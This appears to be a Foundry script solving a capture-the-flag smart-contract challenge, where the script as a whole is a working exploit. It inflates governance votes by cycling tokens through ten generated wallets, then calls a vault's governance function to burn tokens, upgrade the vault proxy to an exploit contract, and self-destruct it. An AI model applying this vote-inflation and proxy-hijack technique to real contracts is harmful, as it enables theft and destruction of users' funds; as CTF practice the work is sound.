// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
// import "forge-ctf/CTFDeployer.sol";

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import "src/Challenge.sol";
import "src/Exploit.sol";

contract DeployExploit is Script {
    Challenge[] public instances;
    Exploit exploit;
    address private i_player_wallet;
    address private i_challenge_contract_address;

    struct Wallet {
        uint256 privateKey;
        address account;
    }

    Wallet[10] private wallets;

    uint256 private constant NUMBER_OF_WALLETS = 10;

    function run() public {
        i_player_wallet = msg.sender;
        i_challenge_contract_address = vm.envAddress("CHALLENGE_CONTRACT_ADDRESS");
        deploy();
    }

    function deploy() internal returns (Exploit) {
        vm.startBroadcast();
        exploit = new Exploit();
        vm.stopBroadcast();

        delegateRep();
        return exploit;
    }

    /// @dev delegate enough rep to the exploit contract to call governanceCall
    function delegateRep() public {
        // create 10 wallets
        vm.startBroadcast(i_player_wallet);
        claim(i_challenge_contract_address);
        vm.stopBroadcast();

        for (uint256 i = 0; i < NUMBER_OF_WALLETS; i++) {
            uint256 privateKey = uint256(keccak256(abi.encodePacked(block.timestamp, i)));
            address account = vm.addr(privateKey);
            wallets[i] = Wallet(privateKey, account);

            // call claim from each wallet to get 10_000 ether
            vm.startBroadcast(i_player_wallet);
            transfer(i_challenge_contract_address, wallets[i].account, 10_000 ether);
            vm.stopBroadcast();

            vm.startBroadcast(wallets[i].account);
            // call delegate from each wallet to delegate 10_000 ether to player wallet
            delegate(i_challenge_contract_address, i_player_wallet);

            transfer(i_challenge_contract_address, i_player_wallet, 10_000 ether);
            vm.stopBroadcast();
        }

        vm.startBroadcast(i_player_wallet);
        require(getCurrentVotes(i_challenge_contract_address) == 100_000 ether);
        console.log("Successfully delegated 100_000 ether to player wallet");

        // call governanceCall from exploit contract

        address diamondCoinAddress = IChallenge(i_challenge_contract_address).diamond();
        address vaultAddress = IChallenge(i_challenge_contract_address).vault();
        burnGovernance(vaultAddress, diamondCoinAddress, 31337);
        console.log("Successfully called governanceCall to burn from exploit contract");

        upgradeGovernance(vaultAddress);
        console.log("Successfully called upgradeTo from exploit contract");

        selfDestructVault(vaultAddress);
        console.log("Successfully called selfDestruct from exploit contract");

        vm.stopBroadcast();
        // vm.startBroadcast(i_player_wallet);
        // address vaultFactory = IChallenge(i_challenge_contract_address).vaultFactory();
        // exploit.reCreateVault(vaultFactory);
        // console.log("Successfully called reCreateVault from exploit contract");
        // vm.stopBroadcast();

        // vm.startBroadcast(i_player_wallet);
        // address hexensCoinAddress = IChallenge(i_challenge_contract_address).hexensCoin();
        // IVault(i_player_wallet).initialize(diamondCoinAddress, hexensCoinAddress);
        // console.log("Successfully called initialize from player wallet");
        // vm.stopBroadcast();

        // vm.startBroadcast(i_player_wallet);
        // upgradeGovernance(vaultAddress);
        // console.log("Second upgradeTo from player wallet");
        // vm.stopBroadcast();

        // vm.startBroadcast(i_player_wallet);
        // exploit.myBurn(diamondCoinAddress);
        // console.log("Successfully called myBurn from exploit contract");
        // vm.stopBroadcast();
    }

    function getCurrentVotes(address challengeContractAddress) public view returns (uint256) {
        address hexensCoinAddress = IChallenge(challengeContractAddress).hexensCoin();
        return IHex(hexensCoinAddress).getCurrentVotes(i_player_wallet);
    }

    function claim(address challengeContractAddress) public {
        IChallenge(challengeContractAddress).claim();
    }

    function transfer(address challengeContractAddress, address to, uint256 amount) public {
        address hexensCoinAddress = IChallenge(challengeContractAddress).hexensCoin();
        IHex(hexensCoinAddress).transfer(to, amount);
    }

    function delegate(address challengeContractAddress, address playerWallet) public {
        address hexensCoinAddress = IChallenge(challengeContractAddress).hexensCoin();
        IHex(hexensCoinAddress).delegate(playerWallet);
    }

    function burnGovernance(address vaultAddress, address token, uint256 amount) public {
        bytes memory data = abi.encodeWithSelector(
            IVault.burn.selector,
            token, // Address to send funds
            amount // Amount to send
        );

        IVault(vaultAddress).governanceCall(data);
    }

    function upgradeGovernance(address vaultAddress) public {
        bytes memory data = abi.encodeWithSelector(IVault.upgradeTo.selector, address(exploit));
        IVault(vaultAddress).governanceCall(data);
    }

    function selfDestructVault(address vaultAddress) public {
        IVault(vaultAddress).selfDestructVault();
    }
}
